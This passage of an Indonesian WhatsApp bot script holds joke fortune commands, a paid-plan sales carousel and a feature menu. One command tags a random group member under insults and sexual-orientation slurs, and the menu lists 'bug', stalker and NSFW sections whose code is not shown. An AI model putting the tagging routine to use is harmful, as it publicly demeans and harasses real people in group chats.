        `${text} akan menjadi orang yang sederhana, keluarga yang harmonis, memiliki ${a} anak, memiliki ${c} kendaraan, memiliki ${a} rumah`,
        `${text} akan menjadi orang yang miskin, tidak memiliki keluarga (jomblo), tidak memiliki anak, tidak memiliki kendaraan, tidak memiliki rumah`,
        `${text} akan menjadi orang yang sederhana, keluarga yang sederhana, memiliki ${d} anak, memiliki ${a} kendaraan, memiliki ${b} rumah`,
        `${text} akan menjadi orang yang sederhana, keluarga yang kacau, tidak memiliki anak (Gugur), memiliki ${b} kendaraan, memiliki ${a} rumah`,
        `${text} akan menjadi orang yang sangat kaya, keluarga yang sangat harmonis, memiliki ${e} anak, memiliki ${f} kendaraan, memiliki ${g} rumah`,
        `${text} akan menjadi orang yang sangat miskin, keluarga yang sederhana, memiliki ${g} anak, tidak memiliki kendaraan, rumah ngontrak`,
        `${text} akan menjadi orang yang kaya, keluarga yang pelit, memiliki ${b} anak, memiliki ${b} kendaraan, memiliki ${b} rumah`,
        `${text} akan menjadi orang yang sederhana, keluarga yang pelit, memiliki ${a} anak, memiliki ${a} kendaraan, memiliki ${a} rumah`,
        `${text} akan menjadi orang yang sederhana, keluarga yang dicerai, memiliki ${b} anak, memiliki ${a} kendaraan, rumah ngontrak`,
        `${text} akan menjadi orang yang sangat sederhana, keluarga yang sakinah, memiliki ${a} anak, memiliki ${a} kendaraan, memiliki ${a} rumah`,
        `${text} akan menjadi orang yang sederhana, keluarga yang sangat sederhana, memiliki ${a}${a} anak, memiliki ${a} kendaraan, memiliki ${a} rumah`,
        `${text} akan menjadi orang yang sederhana, keluarga yang sangat sederhana, memiliki ${b} anak kembar, memiliki ${c} kendaraan, memiliki ${b} rumah`,
        `${text} akan menjadi orang yang sederhana, keluarga yang sederhana, memiliki ${b} anak kembar dan ${a} anak lagi, memiliki ${a} kendaraan, memiliki ${a} rumah`,
    ]
    const msdpan = msdpn[Math.floor(Math.random() * msdpn.length)]
  m.reply(msdpan)
    if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'bego':
case 'goblok':
case 'janda':
case 'perawan':
case 'babi':
case 'tolol':
case 'pinter':
case 'pintar':
case 'asu':
case 'bodoh':
case 'gay':
case 'lesby':
case 'bajingan':
case 'jancok':
case 'anjing':
case 'ngentod':
case 'ngentot':
case 'monyet':
case 'mastah':
case 'newbie':
case 'bangsat':
case 'bangke':
case 'sange':
case 'sangean':
case 'dakjal':
case 'horny':
case 'wibu':
case 'puki':
case 'peak':
case 'pantex':
case 'pantek':
case 'setan':
case 'iblis':
case 'cacat':
case 'yatim':
case 'piatu': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
      if (!m.isGroup)return warning(mess.OnlyGrup)
      let member = participants.map(u => u.id).filter(v => v !== vreden.user.jid)
      let org = member[Math.floor(Math.random() * member.length)];
      vreden.sendMessage(m.chat, { text: `Anak ${command} di sini adalah @${org.split('@')[0]}`, mentions: [org] }, { quoted: m })
      }
      break;
case 'sangecek': case 'ceksange': case 'gaycek': case 'cekgay': case 'lesbicek': case 'ceklesbi': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!q) return warning(`Penggunaan ${command} Nama\n\nContoh : ${command} Lisaa`)
const sangeh = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
m.reply(`Nama : ${q}\nJawaban : *${sange}%*`)
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'kapankah': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!q) return warning(`Penggunaan ${command} Pertanyaan\n\nContoh : ${command} Saya Mati`)
const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi', '20 Hari Lagi', '25 Hari Lagi', '30 Hari Lagi', '35 Hari Lagi', '40 Hari Lagi', '45 Hari Lagi', '50 Hari Lagi', '55 Hari Lagi', '60 Hari Lagi', '65 Hari Lagi', '70 Hari Lagi', '75 Hari Lagi', '80 Hari Lagi', '85 Hari Lagi', '90 Hari Lagi', '95 Hari Lagi', '100 Hari Lagi', '5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi', '20 Bulan Lagi', '25 Bulan Lagi', '30 Bulan Lagi', '35 Bulan Lagi', '40 Bulan Lagi', '45 Bulan Lagi', '50 Bulan Lagi', '55 Bulan Lagi', '60 Bulan Lagi', '65 Bulan Lagi', '70 Bulan Lagi', '75 Bulan Lagi', '80 Bulan Lagi', '85 Bulan Lagi', '90 Bulan Lagi', '95 Bulan Lagi', '100 Bulan Lagi', '1 Tahun Lagi', '2 Tahun Lagi', '3 Tahun Lagi', '4 Tahun Lagi', '5 Tahun Lagi', 'Besok', 'Lusa', `Abis Command Ini Juga Lu ${q}`]
const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
m.reply(`Pertanyaan : ${q}\nJawaban : *${kapankah}*`)
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'wangy': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!q) return warning(`Contoh : ${prefix}wangy Vreden`)
qq = q.toUpperCase()
awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
m.reply(awikwok)
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
//▢━━━━━━━━━━━━━━「 MAIN COMMAND 」━━━━━━━━━━━━━━▢
case 'katalog': {
const uploadFile = { upload: vreden.waUploadToServer };
        var imageMessage = await prepareWAMessageMedia(
          {
            image: { url: "https://telegra.ph/file/951b678d8c410a5fb7280.jpg" },
          },
          uploadFile,
        );
        const product = {
          productImage: imageMessage.imageMessage,
          productId: "7066960336725723",
          title: "WhatsApp Bussines Api",
          description: "Nyari Apa Dek?",
          currencyCode: "IDR",
          priceAmount1000: "25000000",
          productImageCount: 1,
        };
        const productData = {
          product: product,
          businessOwnerJid: "6285643115199@s.whatsapp.net",
        };
        const productMessage = { productMessage: productData };
        var response = await generateWAMessageFromContent(
          m.chat,
          proto.Message.fromObject(productMessage),
          m.quoted && m.quoted.fromMe
            ? { contextInfo: { ...m.msg.contextInfo } }
            : { quoted: m },
        );
        await vreden.relayMessage(m.chat, response.message, {
          messageId: response.key.id,
        });
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'sc': case 'script': case 'sewabot': case 'daftarprem': case 'buyprem': case 'price': case 'sewa': {
const uploadFile = { upload: vreden.waUploadToServer };        
var freeo = await prepareWAMessageMedia(
          {
            image: { url: "https://telegra.ph/file/951b678d8c410a5fb7280.jpg" },
          },
          uploadFile,
        );
        var basic1 = await prepareWAMessageMedia(
          {
            image: { url: "https://telegra.ph/file/3ea67160f7b4683891400.jpg" },
          },
          uploadFile,
        );
var basic2 = await prepareWAMessageMedia(
          {
            image: { url: "https://telegra.ph/file/0563e17d0aa140f1701e1.jpg" },
          },
          uploadFile,
        );
        var basic3 = await prepareWAMessageMedia(
          {
            image: { url: "https://telegra.ph/file/e4f8c898fa0c1acb6971d.jpg" },
          },
          uploadFile,
        );
        var silver1 = await prepareWAMessageMedia(
          {
            image: { url: "https://telegra.ph/file/b92187fe3c773a8a593a8.jpg" },
          },
          uploadFile,
        );
        var silver2 = await prepareWAMessageMedia(
          {
            image: { url: "https://telegra.ph/file/6aa142911961028816e09.jpg" },
          },
          uploadFile,
        );
        var silver3 = await prepareWAMessageMedia(
          {
            image: { url: "https://telegra.ph/file/03738f9010a77a4e4a2be.jpg" },
          },
          uploadFile,
        );
        var gold1 = await prepareWAMessageMedia(
          {
            image: { url: "https://telegra.ph/file/52f3f28f2495882e9eb15.jpg" },
          },
          uploadFile,
        );
        var gold2 = await prepareWAMessageMedia(
          {
            image: { url: "https://telegra.ph/file/6227c0f7b439dbb9e3c2c.jpg" },
          },
          uploadFile,
        );
        var gold3 = await prepareWAMessageMedia(
          {
            image: { url: "https://telegra.ph/file/ec1d2c45d7e199f19277a.jpg" },
          },
          uploadFile,
        );
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: "Geser untuk melihat"
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: footxt
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: "*Silahkan Pilih Plan Kamu*",
            subtitle: "Yahya Almuthahar",
            hasMediaAttachment: false
          }),
         carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.create({
            cards: [{
            body: proto.Message.InteractiveMessage.Body.create({
            text: `*• Free Script* Rp 0
   Error Tanggung sendiri`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: footxt
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: "*FREE PLAN*",
            subtitle: "Yahya Almuthahar",
            imageMessage: freeo.imageMessage,
            hasMediaAttachment: true
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "cta_url",
                "buttonParamsJson": `{\"display_text\":\"📥 Download ( Free )\",\"url\":\"https://www.vreden.my.id\",\"merchant_url\":\"https://www.vreden.my.id\"}`
              }
           ],
          })},{
            body: proto.Message.InteractiveMessage.Body.create({
            text: `*• Starter 1* _~Rp 6.000~_ Rp 5.000
   1 Minggu Masuk Grup
   1 Minggu Premium`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: footxt
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: "*STATER PLAN*",
            subtitle: "Yahya Almuthahar",
            imageMessage: basic1.imageMessage,
            hasMediaAttachment: true
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "cta_url",
                "buttonParamsJson": `{\"display_text\":\"🛍️ Buy ( Starter 1 )\",\"url\":\"https://api.whatsapp.com/send/?phone=${numm.split("@")[0]}&text=Min+Beli+Bot+Starter+1\",\"merchant_url\":\"https://api.whatsapp.com/send/?phone=${numm.split("@")[0]}&text=Min+Beli+Bot+Starter+1\"}`
              }
           ],
          })},{
            body: proto.Message.InteractiveMessage.Body.create({
            text: `*• Starter 2* Rp 3.000
   1 Minggu Masuk Grup`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: footxt
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: "*STATER PLAN*",
            subtitle: "Yahya Almuthahar",
            imageMessage: basic2.imageMessage,
            hasMediaAttachment: true
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "cta_url",
                "buttonParamsJson": `{\"display_text\":\"🛍️ Buy ( Starter 2 )\",\"url\":\"https://api.whatsapp.com/send/?phone=${numm.split("@")[0]}&text=Min+Beli+Bot+Starter+2\",\"merchant_url\":\"https://api.whatsapp.com/send/?phone=${numm.split("@")[0]}&text=Min+Beli+Bot+Starter+2\"}`
              }
           ],
          })},{
            body: proto.Message.InteractiveMessage.Body.create({
            text: `*• Starter 3* Rp 3.000
   1 Minggu Premium`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: footxt
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: "*STATER PLAN*",
            subtitle: "Yahya Almuthahar",
            imageMessage: basic3.imageMessage,
            hasMediaAttachment: true
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "cta_url",
                "buttonParamsJson": `{\"display_text\":\"🛍️ Buy ( Starter 3 )\",\"url\":\"https://api.whatsapp.com/send/?phone=${numm.split("@")[0]}&text=Min+Beli+Bot+Starter+3\",\"merchant_url\":\"https://api.whatsapp.com/send/?phone=${numm.split("@")[0]}&text=Min+Beli+Bot+Starter+3\"}`
              }
           ],
          })},{
            body: proto.Message.InteractiveMessage.Body.create({
            text: `*• Scale 1* _~Rp 15.000~_ Rp 12.000
   1 Bulan Masuk Grup
   1 Bulan Premium`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: footxt
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: "*SCALE PLAN*",
            subtitle: "Yahya Almuthahar",
            imageMessage: silver1.imageMessage,
            hasMediaAttachment: true
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "cta_url",
                "buttonParamsJson": `{\"display_text\":\"🛒 Buy ( Scale 1 )\",\"url\":\"https://api.whatsapp.com/send/?phone=${numm.split("@")[0]}&text=Min+Beli+Bot+Scale+1\",\"merchant_url\":\"https://api.whatsapp.com/send/?phone=${numm.split("@")[0]}&text=Min+Beli+Bot+Scale+1\"}`
              }
           ],
          })},{
            body: proto.Message.InteractiveMessage.Body.create({
            text: `*• Scale 2* Rp 10.000
   1 Bulan Masuk Grup`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: footxt
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: "*SCALE PLAN*",
            subtitle: "Yahya Almuthahar",
            imageMessage: silver2.imageMessage,
            hasMediaAttachment: true
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "cta_url",
                "buttonParamsJson": `{\"display_text\":\"🛒 Buy ( Scale 2 )\",\"url\":\"https://api.whatsapp.com/send/?phone=${numm.split("@")[0]}&text=Min+Beli+Bot+Scale+2\",\"merchant_url\":\"https://api.whatsapp.com/send/?phone=${numm.split("@")[0]}&text=Min+Beli+Bot+Scale+2\"}`
              }
           ],
          })},{
            body: proto.Message.InteractiveMessage.Body.create({
            text: `*• Scale 3* Rp 5.000
   1 Bulan Premium`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: footxt
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: "*SCALE PLAN*",
            subtitle: "Yahya Almuthahar",
            imageMessage: silver3.imageMessage,
            hasMediaAttachment: true
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "cta_url",
                "buttonParamsJson": `{\"display_text\":\"🛒 Buy ( Scale 3 )\",\"url\":\"https://api.whatsapp.com/send/?phone=${numm.split("@")[0]}&text=Min+Beli+Bot+Scale+3\",\"merchant_url\":\"https://api.whatsapp.com/send/?phone=${numm.split("@")[0]}&text=Min+Beli+Bot+Scale+3\"}`
              }
           ],
          })},{
            body: proto.Message.InteractiveMessage.Body.create({
            text: `*• Enterprise 1* Rp 30.000
  1 Bulan Owner Bot`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: footxt
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: "*ENTERPRISE PLAN*",
            subtitle: "Yahya Almuthahar",
            imageMessage: gold1.imageMessage,
            hasMediaAttachment: true
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "cta_url",
                "buttonParamsJson": `{\"display_text\":\"💳 Buy ( Enterprise 1 )\",\"url\":\"https://api.whatsapp.com/send/?phone=${numm.split("@")[0]}&text=Min+Beli+Bot+Enterprise+1\",\"merchant_url\":\"https://api.whatsapp.com/send/?phone=${numm.split("@")[0]}&text=Min+Beli+Bot+Enterprise+1\"}`
              }
           ],
          })},{
            body: proto.Message.InteractiveMessage.Body.create({
            text: `*• Enterprise 2* Rp 25.000
  1 Unit Script Bot
  Scan Code`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: footxt
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: "*ENTERPRISE PLAN*",
            subtitle: "Yahya Almuthahar",
            imageMessage: gold2.imageMessage,
            hasMediaAttachment: true
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "cta_url",
                "buttonParamsJson": `{\"display_text\":\"💳 Buy ( Enterprise 2 )\",\"url\":\"https://api.whatsapp.com/send/?phone=${numm.split("@")[0]}&text=Min+Beli+Bot+Enterprise+2\",\"merchant_url\":\"https://api.whatsapp.com/send/?phone=${numm.split("@")[0]}&text=Min+Beli+Bot+Enterprise+2\"}`
              }
           ],
          })},{
            body: proto.Message.InteractiveMessage.Body.create({
            text: `*• Enterprise 3* Rp 30.000
  1 Unit Script Bot
  Pairing Code`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: footxt
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: "*ENTERPRISE PLAN*",
            subtitle: "Yahya Almuthahar",
            imageMessage: gold3.imageMessage,
            hasMediaAttachment: true
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "cta_url",
                "buttonParamsJson": `{\"display_text\":\"💳 Buy ( Enterprise 3 )\",\"url\":\"https://api.whatsapp.com/send/?phone=${numm.split("@")[0]}&text=Min+Beli+Bot+Enterprise+3\",\"merchant_url\":\"https://api.whatsapp.com/send/?phone=${numm.split("@")[0]}&text=Min+Beli+Bot+Enterprise+3\"}`
              }
           ],
          })}],
            })
        })
    }
  }
}, { quoted: m })

await vreden.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'waktu': case 'time': case 'cekwaktu':{
let baru = hitungmundur(1, 1, 2025)
let ramadhan = hitungmundur(12, 4, 2024) 
let natal = hitungmundur(25, 12, 2024) 
await vreden.sendMessage(m.chat, {
text: `*WAKTU INFO*\n\n\n*Jam* : ${jam}\n\n*Lebaran* :\nJangan Lupa THR nya kak >.<\n\n*Tahun Baru* :\n${baru}\n\n*Natal* :\n${natal}\n\n\n_Manfaatkan Lah Waktu Sempatmu, Sebelum Datang Waktu Sempitmu, Karena Momen Berharga Tak Mungkin Dapat Terulang Kembali_ >_<`,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fconver})
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'allmenu':{
let allmenu = `${ucapanWaktu}
*_Silahkan Dilihat Alfiturnya..._*


▢━━「 *MAIN* 」━━▢

${cmdMain.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

▢━━「 *FITUR GRUP* 」━━▢

${cmdGrup.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

▢━━「 *DOWNLOADER* 」━━▢

${cmdDown.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

▢━━「 *SEARCHING* 」━━▢

${cmdSearch.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

▢━━「 *CONVERTER* 」━━▢

${cmdConvert.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

▢━━「 *FITUR GAME* 」━━▢

${cmdGame.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

▢━━「 *OPEN AI* 」━━▢

${cmdAi.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

▢━━「 *RPG GAME* 」━━▢

${cmdRPG.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

▢━━「 *EPHOTO 360* 」━━▢

${cmdEph.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

▢━━「 *FUN (GABUT)* 」━━▢

${cmdFun.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

▢━━「 *OWNER* 」━━▢

${cmdOwn.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

▢━━「 *ISLAMI* 」━━▢

${cmdIslam.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

▢━━「 *STORAGE* 」━━▢

${cmdStorage.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

▢━━「 *ASUPAN* 」━━▢

${cmdAsupan.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

▢━━「 *CEWEK ASIA* 」━━▢

${cmdCwe.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

▢━━「 *QUOTES* 」━━▢

${cmdQuo.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

▢━━「 *RANDOM* 」━━▢

${cmdRdm.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

▢━━「 *STALKER* 」━━▢

${cmdStalk.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

▢━━「 *STICKER* 」━━▢

${cmdStiker.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

▢━━「 *STORE* 」━━▢

${cmdStore.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

▢━━「 *ANONYMOUS* 」━━▢

${cmdAnom.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

▢━━「 *NSFW (18+)* 」━━▢

${cmdNsfw.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

▢━━「 *BALANCE* 」━━▢

${cmdBal.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

▢━━「 *COWO GANTENG* 」━━▢

${cmdCwo.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

▢━━「 *BUG FITUR* 」━━▢

*LOW MODE*
${cmdBug.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

*HARD MODE*
${cmdBugHard.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

▢━━「 *PTERODACTLY* 」━━▢

${cmdPanel.sort((a, b) => a.localeCompare(b)).map((v, i) => `⌬〡 ${prefix}`+ v).join('\n')}

> ${footxt}
`
await vreden.sendMessage(m.chat, {
text: allmenu,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fconver})
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'tester': {
let { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys')

let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: "test"
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: footxt
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: "test",
            subtitle: "test",
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": "{\"title\":\"MENU\",\"sections\":[{\"title\":\"MENU BOT QIOO OFFICIAL\",\"highlight_label\":\"Qioo Official\",\"rows\":[{\"header\":\"header\",\"title\":\"title\",\"description\":\"description\",\"id\":\".play\"},{\"header\":\"header\",\"title\":\"title\",\"description\":\"description\",\"id\":\".play\"}]}]}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"quick_reply\",\"id\":\".mute on\"}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": `{\"display_text\":\"url\",\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}`
              },
              {
                 "name": "cta_call",
                 "buttonParamsJson": `{\"display_text\":\"call\",\"id\":\"message\"}`
              },
              {
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"copy\",\"id\":\"123456789\",\"copy_code\":\"message\"}`
              },
              {
                 "name": "cta_reminder",
                 "buttonParamsJson": `{\"display_text\":\"cta_reminder\",\"id\":\"message\"}`
              },
              {
                 "name": "cta_cancel_reminder",
                 "buttonParamsJson": `{\"display_text\":\"cta_cancel_reminder\",\"id\":\"message\"}`
              },
              {
                 "name": "address_message",
                 "buttonParamsJson": `{\"display_text\":\"address_message\",\"id\":\"message\"}`
              },
              {
                 "name": "send_location",
                 "buttonParamsJson": ""
              }
           ],
          })
        })
    }
  }
}, {})

await vreden.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'totalfeature': case 'totalfiture': case 'totalfitur': {
if (m.isGroup) return warning('Fitur Khusus Di private chat!')
let { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys')

let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `\n- *Total Fitur:* ${totalFitur()}\n- *Total Error:* 4\n- *Fitur Online:* ${totalFitur() - 4}\n`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: footxt
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title:  "乂 FITUR - INFO",
            subtitle: "Yahya Ali Almuthahar",
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
              "name": "review_and_pay",
"buttonParamsJson": `{\n  currency: 'IDR',\n  payment_configuration: '',\n  payment_type: '',\n  transaction_id: '',\n  total_amount: { value: 3000000, offset: 100 },\n  reference_id: '4N88TZPXWUM',\n  type: 'physical-goods',\n  payment_method: '',\n  order: {\n    status: 'pending',\n    description: '',\n    subtotal: { value: 3500000, offset: 100 },\n    tax: { value: 500000, offset: 100 },\n    discount: { value: 1100000, offset: 100 },\n    shipping: { value: 100000, offset: 100 },\n    order_type: 'ORDER',\n    items: [\n  {\n    retailer_id: 'custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0',\n    name: 'Total All Fitur',\n    amount: { value: 3000, offset: 100 },\n    quantity: ${totalFitur()}\n  }\n]\n  },\n  additional_note: ''\n}`
}
           ],
          })
        })
    }
  }
}, {quoted: fconver} )

await vreden.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'menu': case 'help':{
let simplemenu = `
*☏  Bot Name :* ${botName}
*♙  Prefix :* [ ${prefix} ]
*♗  Platform :* IOS
*₪  Jam :* ${jam}
*▨  Total Fitur:* ${totalFitur()} Fitur
*⚿  Total Error:* 4 Fitur
`
let button = [
              {
                "name": "single_select",
